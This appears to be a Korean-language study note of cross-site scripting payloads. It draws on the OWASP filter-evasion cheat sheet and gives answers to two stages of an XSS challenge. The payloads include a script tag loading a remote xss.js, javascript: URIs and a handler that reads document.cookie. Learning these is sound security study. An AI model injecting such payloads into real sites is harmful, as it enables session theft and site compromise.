# Hacking

### 1. Script

```html
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
```

src에 스크립트 삽입

### 2. Img

```html
<IMG SRC="javascript:alert('XSS');">
```

대소문자 구분 X

위와 같이 scr에 스크립트 삽입

### 3. A

```html
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
<A HREF="http://127.0.0.1/">XSS</A>
```

속성 값 조작

### 4. Iframe

```html
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME src=http://3w.org/XSS.html <
```

src에 스크립트 삽입

이중 개방 앵글 브래킷

### 5. Style

```html
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```

STYLE 시트 조작

[XSS Filter Evasion - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

## XSS Challenges

### Stage 4

```html
"><script>alert(document.domain);</script><"
```

p3 파라미터에 삽입

### Stage 5

```html
"><script>alert(document.domain);</script><"
```

input의 maxlength 변경